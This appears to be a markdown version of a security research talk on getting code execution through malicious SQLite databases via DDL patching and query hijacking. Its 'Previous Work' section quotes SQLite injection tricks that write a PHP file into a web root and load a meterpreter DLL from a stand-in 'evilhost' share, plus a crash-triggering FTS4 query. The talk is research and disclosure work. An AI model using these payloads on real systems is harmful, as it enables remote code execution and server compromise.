# Gaining Code Execution Using a Malicious SQLite Database

## Presenter
- **Omer Gull**
  - Vulnerability Researcher
  - Formerly at Check Point Research (3 years)
  - Currently at Hunters.AI

## Agenda
1. Motivation and Backstory
2. Introduction to SQLite3
3. Examining the Attack Surface of a Malicious Database
4. Previous Work
5. Memory Corruptions Exploitation Using Pure SQL
6. Query Oriented Programming (QOP)Â©
7. Demos
8. Future Work and Conclusion

## Motivation
- SQLite is one of the most widely deployed software modules.
- Querying an SQLite database is generally considered safe.
- However, this assumption can be misleading.

## Prologue
- **Password Stealers:**
  - A computer gets infected by malware.
  - The malware collects stored credentials from various clients.
  - Some client software stores secrets in SQLite databases.
  - The malware sends these SQLite databases to a Command and Control (C2) server.
  - The C2 server extracts and stores the stolen secrets.

## How It All Began
- While examining the leaked sources of a notorious password stealer, @Omriher and I realized:
  - These attackers harvest multiple SQLite databases and parse them on their backend.
  - We wondered if we could leverage the loading and querying of untrusted databases to our advantage.
  - Given SQLite's widespread use, this could have significant implications in various scenarios.
  - This led to what felt like the longest Capture the Flag (CTF) challenge.

## Introduction to SQLite3
- Unlike other SQL databases, SQLite does not have a client-server architecture.
- It reads and writes directly to files.
- A complete database with multiple tables, indices, triggers, and views is contained in a single file.

## Examining the Attack Surface
- **sqlite3_open($FileDB)**
  - Setup and configuration code.
  - Straightforward header parsing.
  - Header is 100 bytes long.
  - Fuzzed extensively by AFL.
  - Not a very promising path for exploitation.

- **sqlite3_query("SELECT...")**
  - According to SQLite authors:
    - SQLite is a Virtual Machine.
    - Queries are compiled to bytecode.
    - `sqlite3_prepare()` walks and expands the query, e.g., rewriting `*` as all column names.
    - `sqlite3LocateTable()` verifies that all relevant objects exist and locates them.
  - "The SELECT statement is the most complicated command in the SQL language."

### Preparation Step
- Every SQLite database has an `sqlite_master` table that defines the schema.
- The `sql` field contains the Data Definition Language (DDL) describing the object.

### Data Definition Language (DDL)
- DDL commands are like header files in C, used to define the structure, names, and types within a database.
- They appear in plain text within the database file.

### Example
```sql
CREATE TABLE my_table (col_a TEXT, col_b TEXT);
INSERT INTO my_table VALUES ('hello', 'world');
```

### Hex Dump of `hello_world.db`
```hex
00000000: 5351 4c69 7465 2066 6f72 6d61 7420 3300  SQLite format 3.
...
00000fb0: 0000 0000 4a01 0617 1d1d 0169 7461 626c  ....J......itabl
...
00001ff0: 000d 0103 1717 6865 6c6c 6f77 6f72 6c64  ......helloworld
```

### Back to Query Preparation
- `sqlite3LocateTable()` finds the structure describing the table being queried.
- Reads the schema from `sqlite_master`.
- If it's the first time, it will also have a callback function for each DDL statement.
- The callback validates the DDL and builds the internal data structures of the object.

### DDL Patching
- Can we replace the SQL query within the DDL?
- Example:
  ```c
  int sqlite3InitCallback(void *pInit, int argc, char **argv, char **NotUsed) {
    InitData *pData = (InitData*)pInit;
    sqlite3 *db = pData->db;
    int iDb = pData->iDb;
    ...
    if (argv == 0) return 0;  // Might happen if EMPTY_RESULT_CALLBACKS are on
    if (argv[1] == 0) {
      corruptSchema(pData, argv[0], 0);
    } else if (sqlite3_strnicmp(argv[2], "create ", 7) == 0) {
      int rc;
      ...
      TESTONLY(rcp = ) sqlite3_prepare(db, argv[2], -1, &pStmt, 0);
    }
  }
  ```

### CREATE VIEW
- A VIEW is a pre-packaged SELECT statement.
- VIEWs are queried similarly to TABLEs.
  ```sql
  SELECT col_a FROM my_table == SELECT col_a FROM my_view
  ```

### Query Hijacking
- Patch `sqlite_master`'s DDL with a VIEW instead of a TABLE.
- The patched VIEW can have any SELECT sub-query.
- This allows interaction with extensive parts of the SQLite interpreter using the SELECT sub-query.

### Query Hijacking Example
- Original database with a single TABLE:
  ```sql
  CREATE TABLE dummy (col_a TEXT, col_b TEXT);
  SELECT col_a, col_b FROM dummy;
  ```
- Patched VIEW:
  ```sql
  CREATE VIEW dummy(cola, colb) AS SELECT 
    (SELECT sqlite_version()), 
    (SELECT printf('SQLite implemented their own %s', 'printf'));
  ```

### Example Output
```sql
sqlite> SELECT cola, colb FROM dummy;
3.24.0|SQLite implemented their own printf
```

### Previous Work
- **SQL Injection:**
  - Known tricks in SQLite.
  - Disabled by default.
  - Example:
    ```sql
    ATTACH DATABASE '/var/www/lol.php' AS lol;
    CREATE TABLE lol.pwn (dataz text);
    INSERT INTO lol.pwn (dataz) VALUES ('');
    SELECT load_extension('\evilhost\evilshare\meterpreter.dll','DllMain');
    ```

- **Memory Corruptions and SQLite:**
  - SQLite is written in C.
  - "Finding bugs in SQLite, the easy way" resulted in 22 bugs in 30 minutes of fuzzing.
  - Example:
    ```sql
    CREATE VIRTUAL TABLE t0 USING fts4(x, order=DESC);
    INSERT INTO t0(docid, x) VALUES (-1E0, '0(o');
    INSERT INTO t0 VALUES('');
    INSERT INTO t0 VALUES('');
    INSERT INTO t0 VALUES('o');
    SELECT docid FROM t0 WHERE t0 MATCH '"0*o"';
    ```

- **WebSQL for Developers:**
  - Web page API for storing data in databases.
  - Queried using JavaScript.
  - SQLite backend.
  - Available in Chrome and Safari.
  - Example:
    ```javascript
    var db = openDatabase('mydb', '1.0', 'Test DB', 2 * 1024 * 1024);
    ```

This presentation aims to highlight the potential security risks associated with SQLite and how they can be exploited.